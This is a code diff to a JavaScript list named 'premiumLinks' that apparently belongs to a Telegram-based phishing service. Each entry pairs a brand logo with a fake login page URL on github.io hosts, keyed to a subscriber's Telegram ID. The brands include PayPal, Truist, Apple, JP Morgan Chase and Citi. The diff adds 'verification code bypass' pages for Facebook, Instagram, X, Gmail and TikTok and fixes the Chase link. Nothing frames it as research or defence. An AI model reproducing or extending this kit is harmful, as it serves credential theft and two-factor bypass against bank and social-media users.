@@ -9,7 +9,12 @@ const premiumLinks = [
       { name: "Paypal login", image: "https://bbott52.github.io/Mobixhub/pa.png", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/pay.html?id={telegram-id}" },
             { name: "Truist bank login", image: "https://bbott52.github.io/Mobixhub/ttr.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/truist.html?id={telegram-id}" },
                   { name: "apple login", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/app.html?id={telegram-id}" },
-                               { name: "JP morgan chase bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPs-HpAJwlI_H9ye7h-_yNGhSSNuCTEZClXohGW1gjmhRlmouqChS1umM&s=10", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/jp.html?id={telegram-id}" },
+                               { name: "JP morgan chase bank", image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSPs-HpAJwlI_H9ye7h-_yNGhSSNuCTEZClXohGW1gjmhRlmouqChS1umM&s=10", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/jb.html?id={telegram-id}" },
                    { name: "Citi bank", image: "https://www.logo.wine/a/logo/Citibank/Citibank-Logo.wine.svg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/nbb/citi.html?id={telegram-id}" },
                                { name: "Apple id", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://fliacrypnloi.github.io/pm/nb/app.html?id={telegram-id}" },
+                                     { name: "Facebook Verification code bypass link", image: "https://rrloaty.github.io/intelligent/face.png", urlTemplate: "https://olptyi.github.io/nb/face?id={telegram-id}" },
+      { name: "Instagram Verification code bypass link", image: "https://rrloaty.github.io/intelligent/inst.png", urlTemplate: "https://olptyi.github.io/nb/ins?id={telegram-id}" },
+      { name: "Twitter(X) Verification code bypass link", image: "https://rrloaty.github.io/intelligent/X.png", urlTemplate: "https://olptyi.github.io/nb/tw?id={telegram-id}" },
+      { name: "Gmail Verification code bypass link", image: "https://rrloaty.github.io/intelligent/gmai.png", urlTemplate: "https://olptyi.github.io/nb/gma?id={telegram-id}" },
+      { name: "Tiktok Verification code bypass link", image: "https://rrloaty.github.io/intelligent/tiktok.png", urlTemplate: "https://olptyi.github.io/nb/ti?id={telegram-id}" },
     ];
